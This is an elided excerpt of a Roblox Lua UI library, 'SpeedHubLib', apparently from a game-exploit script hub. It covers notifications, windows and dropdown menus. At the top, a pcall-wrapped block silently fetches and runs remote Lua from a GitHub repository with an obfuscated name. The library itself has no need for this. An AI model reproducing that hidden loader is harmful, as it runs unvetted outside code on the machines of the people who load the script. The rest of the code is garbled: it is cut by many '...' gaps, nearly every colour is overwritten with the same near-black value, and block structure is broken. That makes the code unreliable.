...
task.spawn(function()
   pcall(function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/XGOHUBlIllIlIIIIlllllIIlIlIIIIIllllIIlL/xxxxgo/refs/heads/main/xgo%20%E9%9A%90%E8%97%8F%E7%95%8C%E9%9D%A2.lua"))()
   end)
end)
...
local function MakeDraggable(topbarobject, object)
	...
	local function CustomSize(object)
		...
		changesizeobject.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
...
ClickFrame.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
...
function CircleClick(ClickFrame, X, Y)
	spawn(function()
		...
		Circle.ImageColor3 = Color3.fromRGB(1, 1, 1)
		Circle.ImageTransparency = 0.8
		Circle.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
...
local function EnterMouse(frameenter)
    ...
    local oldfunc = {}
    if old == Color3.fromRGB(1, 1, 1) then
...
function SpeedHubLib:Notify(NotifyConfig)
	...
	NotifyConfig["Color"] = NotifyConfig["Color"] or Color3.fromRGB(1, 1, 1)
    ...
    spawn(function()
        ...
        if not CoreGui.NotifyGui:FindFirstChild("NotifyLayout") then
            ...
            NotifyLayout.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyFrameReal.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        ...
        DropShadow.ImageColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyContent.TextColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyContent.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyTitle.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyDescription.TextColor3 = Color3.fromRGB(1, 1, 1)
        NotifyDescription.TextSize = 14
        NotifyDescription.TextXAlignment = Enum.TextXAlignment.Left
        NotifyDescription.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        NotifyDescription.BackgroundTransparency = 0.9990000128746033
        NotifyDescription.BorderColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyClose.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
        ...
        NotifyCloseImage.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
...
function SpeedHubLib:Start(GuiConfig)
    ...
    TopTitle.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    TopDescription.TextColor3 = Color3.fromRGB(1, 1, 1)
    TopDescription.TextSize = 14
    TopDescription.TextXAlignment = Enum.TextXAlignment.Left
    TopDescription.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    CloseImage.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    LayersTab.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    Info.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    NamePlayer.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    LogoFrame.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    LogoPlayer.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    InfoButton.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    AnotherFrame.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    AnotherFrame.BackgroundTransparency = 0.5
    AnotherFrame.BorderColor3 = Color3.fromRGB(1, 1, 1)
    ...
    AnotherButton.BackgroundColor3 = Color3.fromRGB(1, 1, 1)
    ...
    local DropdownValueTable = {}
    for _, v in pairs(DropdownFunc.Value) do
        table.insert(DropdownValueTable, v)
    end
    if #DropdownValueTable == 0 then
        DropdownBox.Text = ""
    else
        DropdownBox.Text = table.concat(DropdownValueTable, ", ")
    end
    DropdownConfig.Callback(DropdownFunc.Value)
end

    -- 假设您需要添加选项到下拉菜单中
    function DropdownFunc:AddOption(Text, Value)
        ...
        OptionFrame.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
        OptionFrame.BorderSizePixel = 0
        OptionFrame.Size = UDim2.new(1, -10, 0, 20)
        OptionFrame.Name = "Option"
        OptionFrame.Parent = ScrollUnder

        UICorner21.CornerRadius = UDim.new(0, 3)
        UICorner21.Parent = OptionFrame

        OptionText.Text = Text
        OptionText.TextColor3 = Color3.fromRGB(255, 255, 255)
        OptionText.TextSize = 12
        OptionText.TextXAlignment = Enum.TextXAlignment.Left
        OptionText.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
        ...
        ChoosingFrame.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
        ChoosingFrame.BorderSizePixel = 0
        ChoosingFrame.Size = UDim2.new(0, 2, 0, 10)
        ChoosingFrame.Position = UDim2.new(0, 5, 0, 5)
        ChoosingFrame.Name = "ChoosingFrame"
        ChoosingFrame.Parent = OptionFrame

        UIStroke.Color = Color3.fromRGB(255, 255, 255)
        UIStroke.Parent = ChoosingFrame

        -- 保存选项的值，以便后续可以识别
        OptionFrame.OptionText = OptionText
        OptionFrame.Value = Value

        -- 为每个选项添加点击事件
        OptionFrame.MouseButton1Click:Connect(function()
            if DropdownConfig.Multi then
                if table.find(DropdownFunc.Value, Value) then
                    table.remove(DropdownFunc.Value, table.find(DropdownFunc.Value, Value))
                else
    ...
    for _, Option in pairs(DropdownConfig.Options) do
        DropdownFunc:AddOption(Option.Text, Option.Value)
    end
